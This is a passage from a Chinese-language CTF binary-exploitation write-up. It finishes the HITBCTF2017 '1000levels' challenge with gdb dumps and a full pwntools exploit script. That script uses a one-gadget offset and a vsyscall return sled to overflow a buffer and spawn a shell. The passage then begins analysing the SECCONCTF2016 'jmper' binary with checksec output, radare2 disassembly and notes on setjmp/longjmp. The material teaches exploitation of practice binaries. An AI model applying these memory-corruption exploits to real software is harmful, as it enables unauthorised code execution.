RAX: 0x0
RBX: 0x0
RCX: 0xa ('\n')
RDX: 0x0
RSI: 0x0
RDI: 0x7fffffffebc0 ('A' , "P")
RBP: 0x4242424242424242 ('BBBBBBBB')
RSP: 0x7fffffffebf8 --> 0xffffffffff600000 (mov rax,0x60)
RIP: 0x555555554f4d (: ret)
1159
6.1.16 pwn HITBCTF2017 1000levels
R8 : 0x0
R9 : 0x1999999999999999
R10: 0x0
R11: 0x7ffff7b845a0 --> 0x2000200020002
R12: 0x5555555549d0 (: xor ebp,ebp)
R13: 0x7fffffffee40 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x555555554f45 : jmp 0x555555554f4c 
0x555555554f47 : mov eax,0x0
0x555555554f4c : leave
=> 0x555555554f4d : ret
0x555555554f4e : push rbp
0x555555554f4f : mov rbp,rsp
0x555555554f52 : sub rsp,0x30
0x555555554f56 : mov QWORD PTR [rbp-0x30],0x0
[------------------------------------stack----------------------
---------------]
0000| 0x7fffffffebf8 --> 0xffffffffff600000 (mov rax,0x60)
0008| 0x7fffffffec00 --> 0xffffffffff600000 (mov rax,0x60)
0016| 0x7fffffffec08 --> 0xffffffffff600000 (mov rax,0x60)
0024| 0x7fffffffec10 --> 0x7ffff7a5226a (mov rax,QWORD PTR [r
ip+0x37ec47] # 0x7ffff7dd0eb8)
0032| 0x7fffffffec18 --> 0x3e8
0040| 0x7fffffffec20 --> 0x4e5546204f ('O FUN')
0048| 0x7fffffffec28 --> 0xff0000
0056| 0x7fffffffec30 --> 0x0
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x0000555555554f4d in level(int) ()
三次 return 之后，就会跳到 one-gadget 上去。
Bingo!!!
1160
6.1.16 pwn HITBCTF2017 1000levels
$ python exp.py
[+] Starting local process './1000levels': pid 6901
[*] Switching to interactive mode
$ whoami
firmy
exploit
完整的 exp 如下：
1161
6.1.16 pwn HITBCTF2017 1000levels
#!/usr/bin/env python
from pwn import *
#context.log_level = 'debug'
io = process(['./1000levels'], env={'LD_PRELOAD':'./libc-2.23.so'
})
one_gadget = 0x4526a
system_offset = 0x45390
ret_addr = 0xffffffffff600000
def go(levels, more):
io.sendlineafter("Choice:\n", '1')
io.sendlineafter("levels?\n", str(levels))
io.sendlineafter("more?\n", str(more))
def hint():
io.sendlineafter("Choice:\n", '2')
if __name__ == "__main__":
hint()
go(0, one_gadget - system_offset)
for i in range(999):
io.recvuntil("Question: ")
a = int(io.recvuntil(" ")[:-1])
io.recvuntil("* ")
b = int(io.recvuntil(" ")[:-1])
io.sendlineafter("Answer:", str(a * b))
payload = 'A' * 0x30 # buffer
payload += 'B' * 0x8 # rbp
payload += p64(ret_addr) * 3
io.sendafter("Answer:", payload)
io.interactive()
1162
6.1.16 pwn HITBCTF2017 1000levels
参考资料
https://ctftime.org/task/4539
1163
6.1.17 pwn SECCONCTF2016 jmper
6.1.17 pwn SECCONCTF2016 jmper
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
$ file jmper
jmper: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dyna
mically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU
/Linux 2.6.24, BuildID[sha1]=9fce8ae11b21c03bf2aade96e1d763be668
848fa, not stripped
$ checksec -f jmper
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Full RELRO No canary found NX enabled No PIE
No RPATH No RUNPATH No 0 4 jmper
$ strings libc-2.19.so | grep "GNU C"
GNU C Library (Ubuntu EGLIBC 2.19-0ubuntu6.9) stable release ver
sion 2.19, by Roland McGrath et al.
Compiled by GNU CC version 4.8.4.
64 位动态链接程序，但 Full RELRO 表示我们不能修改 GOT 表，然后还开启了
NX 防止注入 shellcode。No canary 表示可能有溢出，not stripped、No PIE 都是
好消息。默认开启 ASLR。
在 Ubuntu-14.04 上玩一下：
$ LD_PRELOAD=./libc-2.19.so ./jmper
Welcome to my class.
My class is up to 30 people :)
1. Add student.
1164
6.1.17 pwn SECCONCTF2016 jmper
2. Name student.
3. Write memo
4. Show Name
5. Show memo.
6. Bye :)
1
1. Add student.
2. Name student.
3. Write memo
4. Show Name
5. Show memo.
6. Bye :)
2
ID:0
Input name:AAAA
1. Add student.
2. Name student.
3. Write memo
4. Show Name
5. Show memo.
6. Bye :)
3
ID:0
Input memo:BBBB
1. Add student.
2. Name student.
3. Write memo
4. Show Name
5. Show memo.
6. Bye :)
4
ID:0
AAAA1. Add student.
2. Name student.
3. Write memo
4. Show Name
5. Show memo.
6. Bye :)
5
ID:0
1165
6.1.17 pwn SECCONCTF2016 jmper
BBBB1. Add student.
2. Name student.
3. Write memo
4. Show Name
5. Show memo.
6. Bye :)
6
似乎是新建的 student 会对应一个 id，根据 id 可以查看或修改对应的 name 和
memo。
题目解析
程序主要由两部分组成，一个是 main() 函数，另一个是实现了所有功能的
f() 函数。
main
[0x00400730]> pdf @ main
/ (fcn) main 170
| main ();
| ; var int local_4h @ rbp-0x4
| ; DATA XREF from 0x0040074d (entry0)
| 0x00400ba8 push rbp
| 0x00400ba9 mov rbp, rsp
| 0x00400bac sub rsp, 0x10
| 0x00400bb0 mov rax, qword [obj.stdin]
; [0x602018:8]=0
| 0x00400bb7 mov ecx, 0
| 0x00400bbc mov edx, 2
| 0x00400bc1 mov esi, 0
| 0x00400bc6 mov rdi, rax
| 0x00400bc9 call sym.imp.setvbuf
; int setvbuf(FILE*stream, char*buf, int mode, size_t siz
e)
| 0x00400bce mov rax, qword [sym.stdout]
; loc.stdout ; [0x602010:8]=0
1166
6.1.17 pwn SECCONCTF2016 jmper
| 0x00400bd5 mov ecx, 0
| 0x00400bda mov edx, 2
| 0x00400bdf mov esi, 0
| 0x00400be4 mov rdi, rax
| 0x00400be7 call sym.imp.setvbuf
; int setvbuf(FILE*stream, char*buf, int mode, size_t siz
e)
| 0x00400bec mov edi, str.Welcome_to_my_class.
; 0x400d88 ; "Welcome to my class."
| 0x00400bf1 call sym.imp.puts
; int puts(const char *s)
| 0x00400bf6 mov edi, str.My_class_is_up_to_30_pe
ople_: ; 0x400da0 ; "My class is up to 30 people :)"
| 0x00400bfb call sym.imp.puts
; int puts(const char *s)
| 0x00400c00 mov edi, 0xf0
; 240
| 0x00400c05 call sym.imp.malloc
; my_class = malloc(0xf0) 分配 my_class 数组
| 0x00400c0a mov qword [obj.my_class], rax
; [0x602030:8]=0
| 0x00400c11 mov edi, 0xc8
; 200
| 0x00400c16 call sym.imp.malloc
; jmpbuf = malloc(0xc8) 分配 jmpbuf 结构体
| 0x00400c1b mov qword [obj.jmpbuf], rax
; [0x602038:8]=0
| 0x00400c22 mov rax, qword [obj.jmpbuf]
; [0x602038:8]=0
| 0x00400c29 mov rdi, rax
| 0x00400c2c call sym.imp._setjmp
; setjmp(jmpbuf) 保存上下文到 jmpbuf
| 0x00400c31 mov dword [local_4h], eax
| 0x00400c34 cmp dword [local_4h], 0
; 将 setjmp 返回值与 0 比较
| ,= 0x00400c41 mov edi, str.Nice_jump__Bye_:
; 0x400dbf ; "Nice jump! Bye :)"
| | 0x00400c46 call sym.imp.puts
; int puts(const char *s)
| | ; JMP XREF from 0x00400c3f (main)
| `--> 0x00400c4b mov eax, 0
| 0x00400c50 leave
\ 0x00400c51 ret
[0x00400730]> is ~my_class
055 0x00002030 0x00602030 GLOBAL OBJECT 8 my_class
[0x00400730]> is ~jmpbuf
065 0x00002038 0x00602038 GLOBAL OBJECT 8 jmpbuf
[0x00400730]> iS ~bss
24 0x00002010 0 0x00602010 48 --rw- .bss
在 main 函数里分配了两块内存空间，一块是包含了 30 个 student 结构体指针的数
组，地址放在 my_class （ 0x00602030 ）。另一块用于存放一个 jmp_buf 结
构体，这个结构体中保存当前上下文，结构体的地址放在
jmpbuf （ 0x00602038 ）。并且这两个符号都在 .bss 段中。
这里就涉及到 setjmp() 和 longjmp() 的使用，它们用于从一个函数跳到另一
个函数中的某个点处。函数原型如下：
#include 
int setjmp(jmp_buf env);
void longjmp(jmp_buf env, int val);
setjmp() ：将函数在此处的上下文保存到 jmp_buf 结构体，以供
longjmp 从此结构体中恢复上下文
env ：保存上下文的 jmp_buf 结构体变量
如果直接调用该函数，返回值为 0。如果该函数从 longjmp 调用返回，返
回值根据 longjmp 的参数决定。
longjmp() ：从 jmp_buf 结构体中恢复由 setjmp 函数保存的上下文，该
函数不返回，而是从 setjmp 函数中返回
env ：由 setjmp 函数保存的上下文
1168
6.1.17 pwn SECCONCTF2016 jmper
val ：传递给 setjmp 函数的返回值，如果 val 值为 0，setjmp 将会
返回 1，否则返回 val 。
longjmp() 执行完之后，程序就回到了 setjmp() 的下一条语句继续执行。
f
接下来我们看一下各功能的实现（程序设计真的要吐槽一下）：
[0x00400730]> pdf @ sym.f
/ (fcn) sym.f 907
| sym.f ();
| ; var int local_1dh @ rbp-0x1d
| ; var int local_1ch @ rbp-0x1c
| ; var int local_18h @ rbp-0x18
| ; var int local_14h @ rbp-0x14
| ; var int local_10h @ rbp-0x10
| ; var int local_8h @ rbp-0x8